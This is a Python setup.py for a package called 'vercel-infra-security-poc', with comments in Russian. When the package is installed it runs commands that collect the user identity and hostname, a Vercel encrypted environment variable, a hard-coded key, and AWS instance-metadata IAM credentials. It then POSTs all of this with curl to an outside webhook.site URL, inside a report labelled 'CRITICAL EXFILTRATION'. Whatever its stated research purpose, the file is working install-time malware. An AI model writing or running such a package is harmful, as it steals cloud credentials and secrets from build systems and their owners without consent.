import os
import subprocess
import base64
from setuptools import setup

# 1. Твой URL и Ключ
WEBHOOK_URL = "https://webhook.site/57c42274-2817-4041-81a2-3f41b2c987a2"
ENC_KEY = "ifLJbKzHv3OTvy7rMiocCKna033QA19Hg/w2jrFucSQ="

def get_final_report():
    # Собираем данные
    identity = subprocess.getoutput('id')
    # Пробуем расшифровать кусочек для доказательства (используем openssl если есть)
    # или просто выводим переменные
    env_content = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT', 'NOT_FOUND')
    
    report = f"""
======= CRITICAL EXFILTRATION =======
USER: {identity}
HOST: {subprocess.getoutput('hostname')}
KEY_FOUND: {ENC_KEY}
ENCRYPTED_BLOB_LEN: {len(env_content)}
AWS_METADATA: {subprocess.getoutput('curl -s -m 1 http://169.254.169.254/latest/meta-data/iam/security-credentials/ || echo "BLOCKED"')}
=====================================
"""
    return report

# Генерируем отчет
final_report = get_final_report()

# 7. Экфильтрация данных через системный curl (как ты просил)
try:
    # Используем input=final_report.encode(), чтобы curl корректно подхватил тело запроса
    subprocess.run(
        ['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', '@-', WEBHOOK_URL],
        input=final_report.encode(),
        check=True
    )
    print("[+] POST sent successfully via curl")
except Exception as e:
    # Печатаем ошибку в консоль, чтобы ты видел, если curl упал
    print(f"[-] Error sending POST: {e}")

# Обязательная часть для setuptools, чтобы скрипт запустился при установке
setup(
    name="vercel-infra-security-poc",
    version="9.9.9",
    description="Vercel Infrastructure Security Research"
)